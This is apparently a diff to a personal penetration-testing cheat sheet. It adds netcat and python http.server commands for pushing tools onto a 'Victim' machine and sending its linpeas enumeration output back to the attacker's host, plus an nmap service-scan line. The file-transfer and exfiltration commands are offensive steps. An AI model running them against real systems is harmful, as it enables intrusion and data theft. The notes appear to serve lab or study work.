@@ -1,3 +1,15 @@
+## Sending files
+Download local file from current directory to remote host, through python server  
+`sudo python3 -m http.server 80` #Host  
+`curl -O http://192.168.0.2/<File Name>` #Victim  
+  
+Send file from remote host back to my computer  
+`nc -lvp 4444 >  linpeasCuiteur.txt` #Host  
+`cat linpeas.txt | nc 192.168.0.2 4444` #Victim  
+
+Store executable file output into a text file  
+`./executable.sh -a > exectuable.txt`  
+
 ## nmap commands
 - `nmap -sV -p <list of ports> <IP address>`: Lists all the services running on the ports
 
